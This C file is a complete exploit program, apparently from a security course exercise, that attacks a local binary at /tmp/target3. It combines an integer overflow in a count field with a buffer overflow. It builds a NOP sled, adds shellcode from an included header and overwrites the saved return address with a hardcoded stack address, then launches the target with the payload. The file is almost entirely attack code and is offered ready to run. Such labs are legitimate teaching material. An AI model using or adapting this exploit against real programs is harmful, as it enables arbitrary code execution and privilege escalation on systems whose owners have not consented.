#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  const int size = 240 * 20 + 10 + 1 + 4 + 4; //buf widgets + 10char int + ',' + ebp + ret
  char attack[size];
  memset(attack, 0x90, size);

  char ret[] = "\xb8\xfc\xff\xbf";
  size_t max_int_plus_one = 2147483647 + 1;
  size_t int_overflow_attack = max_int_plus_one + size / 20 + size % 2;

  snprintf(attack, 11, "%u", int_overflow_attack);
  memcpy(attack + 10, ",", 1);
  memcpy(attack + size - 49, shellcode, 45);
  memcpy(attack + size - 4, ret, 4);
  
  args[0] = TARGET; args[1] = attack; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
